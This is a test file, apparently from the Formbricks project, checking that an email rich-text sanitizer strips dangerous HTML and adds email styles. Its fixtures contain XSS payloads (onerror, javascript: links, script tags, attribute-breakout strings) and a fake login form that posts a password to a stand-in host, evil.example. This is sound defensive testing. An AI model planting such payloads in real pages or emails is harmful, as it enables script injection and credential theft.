// @vitest-environment jsdom
// jsdom for `DOMParser`, to parse the output the way a mail client would.
import DOMPurify from "isomorphic-dompurify";
import { describe, expect, test } from "vitest";
import {
  NESTED_LIST_ITEM_CLASS,
  NESTED_LIST_ITEM_MARKER_STYLE,
} from "@/modules/ui/components/editor/lib/example-theme";
import { prepareEmailRichText } from "./preview-email-template-styles";

const marker = `style="${NESTED_LIST_ITEM_MARKER_STYLE}"`;

describe("prepareEmailRichText", () => {
  test.each([
    [
      "a form with inputs",
      '<p>Hi</p><form action="https://evil.example/steal"><input name="password"><button>Log in</button></form>',
      ["<form", "<input", "<button", "evil.example"],
    ],
    ["an image with an error handler", '<img src="x" onerror="alert(1)">Photo', ["<img", "onerror"]],
    ["a javascript: link", '<a href="javascript:alert(1)">click</a>', ["javascript:"]],
    ["a script", "<script>alert(1)</script>Hello", ["<script", "alert(1)"]],
    [
      "an iframe and a style block",
      '<iframe src="https://evil.example"></iframe><style>body{display:none}</style>Text',
      ["<iframe", "<style", "display:none"],
    ],
    ["an event handler on an allowed tag", '<p onclick="steal()">x</p>', ["onclick"]],
  ])("strips %s", (_case, html, forbidden) => {
    const result = prepareEmailRichText(html);

    for (const fragment of forbidden) {
      expect(result).not.toContain(fragment);
    }
  });

  // DOMPurify on jsdom leaves `<` and `>` unescaped inside attribute values. Editing the sanitized
  // string by tag boundaries would end a tag inside the value and turn the rest into live markup.
  test.each([
    ["a paragraph's class", '<p class="a><img src=x onerror=alert(1)>">t</p>'],
    ["a paragraph's dir", '<p dir="x><form action=https://evil.example><input name=password>">t</p>'],
    [
      "a nested-list wrapper li's value",
      `<ul><li class="${NESTED_LIST_ITEM_CLASS}" value="1><img src=x onerror=alert(1)>"><ul><li>c</li></ul></li></ul>`,
    ],
  ])("keeps markup inside %s as text once the email's styles are added", (_case, html) => {
    const parsed = new DOMParser().parseFromString(prepareEmailRichText(html), "text/html");

    expect(parsed.body.querySelector("img, form, input, [onerror]")).toBeNull();
  });

  test("keeps what the editor writes and adds the email's paragraph spacing", () => {
    const html =
      '<p class="fb-editor-paragraph" dir="ltr"><b><strong class="fb-editor-text-bold">Bold</strong></b>, ' +
      '<i><em class="fb-editor-text-italic">italic</em></i>, <u>underline</u> and ' +
      '<a href="https://formbricks.com" class="fb-editor-link" target="_blank" rel="noopener">a link</a></p>' +
      '<h1 class="fb-editor-heading-h1">Title</h1>' +
      '<ol start="3" class="fb-editor-list-ol"><li value="3" class="fb-editor-listitem">Third</li></ol>' +
      '<p><a href="mailto:help@example.com">Mail us</a><br></p>';

    expect(prepareEmailRichText(html)).toBe(
      '<p class="fb-editor-paragraph" dir="ltr" style="margin:0"><b><strong class="fb-editor-text-bold">Bold</strong></b>, ' +
        '<i><em class="fb-editor-text-italic">italic</em></i>, <u>underline</u> and ' +
        '<a href="https://formbricks.com" class="fb-editor-link" target="_blank" rel="noopener">a link</a></p>' +
        '<h1 class="fb-editor-heading-h1">Title</h1>' +
        '<ol start="3" class="fb-editor-list-ol"><li value="3" class="fb-editor-listitem">Third</li></ol>' +
        '<p style="margin:0"><a href="mailto:help@example.com">Mail us</a><br></p>'
    );
  });

  test.each([
    ["a paragraph", '<p style="position:fixed;top:0;color:red">Hi</p>', '<p style="margin:0">Hi</p>'],
    [
      "a nested-list wrapper li",
      `<ul><li class="${NESTED_LIST_ITEM_CLASS}" style="color:red"><ul><li>child</li></ul></li></ul>`,
      `<ul><li class="${NESTED_LIST_ITEM_CLASS}" ${marker}><ul><li>child</li></ul></li></ul>`,
    ],
    [
      "a wrapper li with other classes and an ordered-list value",
      `<ol><li value="2" class="fb-editor-listitem ${NESTED_LIST_ITEM_CLASS}"><ol></ol></li></ol>`,
      `<ol><li value="2" class="fb-editor-listitem ${NESTED_LIST_ITEM_CLASS}" ${marker}><ol></ol></li></ol>`,
    ],
  ])("sets the email's own style on %s", (_case, html, expected) => {
    expect(prepareEmailRichText(html)).toBe(expected);
  });

  test.each([
    [
      "list items without the nested class",
      '<ul><li class="fb-editor-listitem" value="1">one</li><li>two</li></ul>',
    ],
    [
      "class names that merely contain the nested class",
      `<ul><li class="${NESTED_LIST_ITEM_CLASS}-custom">item</li></ul>`,
    ],
  ])("leaves %s without a marker style", (_case, html) => {
    expect(prepareEmailRichText(html)).toBe(html);
  });

  test("leaves later DOMPurify calls elsewhere in the app without the email's styles", () => {
    prepareEmailRichText("<p>email</p>");

    expect(DOMPurify.sanitize("<p>app</p>")).toBe("<p>app</p>");
  });

  test("keeps encoded markup as text", () => {
    expect(prepareEmailRichText("<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>")).toBe(
      '<p style="margin:0">&lt;script&gt;alert(1)&lt;/script&gt;</p>'
    );
  });
});
